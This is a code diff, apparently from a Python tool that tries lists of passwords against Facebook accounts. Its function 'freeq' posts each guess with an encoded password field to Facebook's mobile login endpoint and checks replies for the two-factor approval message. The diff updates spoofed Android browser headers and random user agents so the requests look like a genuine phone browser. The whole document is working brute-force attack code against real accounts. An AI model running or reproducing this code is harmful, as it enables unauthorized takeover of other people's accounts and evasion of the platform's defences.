@@ -2088,8 +2088,6 @@ def freeq(uid,pwx,tl):
     try:
         for pw in pwx:
             ua = random.choice(uas)
-            time_now = int(datetime.now().timestamp())
-            enc_password = f"#PWD_BROWSER:0:{time_now}:{pw}"
             pro = random.choice(SUMONua)
             ses = requests.Session()
             free_fb = ses.get('https://m.facebook.com').text
@@ -2099,25 +2097,33 @@ def freeq(uid,pwx,tl):
             'email': uid,
             'next': 'https://m.facebook.com/login/save-device/',
             'flow': 'login_no_pin',
-            'encpass': enc_password,
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             'login': 'Masuk'}
             headers = {
-            'authority': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
+            "Host": "m.facebook.com",
+            "Connection": "keep-alive",
+            "Cache-Control": "max-age=0",
+            "dpr": "2.4749999046325684",
+            "viewport-width": "980",
+            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="126", "Android WebView";v="126"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": '"Android"',
+            "sec-ch-ua-platform-version": '"13"',
+            "sec-ch-ua-model": '"vivo V2060"',
+            "sec-ch-ua-full-version-list": '"Not_A Brand";v="8.0.0.0", "Chromium";v="126.0.6478.188", "Android WebView";v="126.0.6478.188"',
+            "sec-ch-prefers-color-scheme": "light",
+            "Upgrade-Insecure-Requests": "1",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36 AlohaBrowser/6.5.4",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "X-Requested-With": "AlohaBrowser",
+            "Sec-Fetch-Site": "cross-site",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-User": "?1",
+            "Sec-Fetch-Dest": "document",
+            "Referer": "https://m.facebook.com/login/",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "en,en-US;q=0.9",
+            "DNT": "1",}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             po = ses.post(url, data=data, headers=headers).text
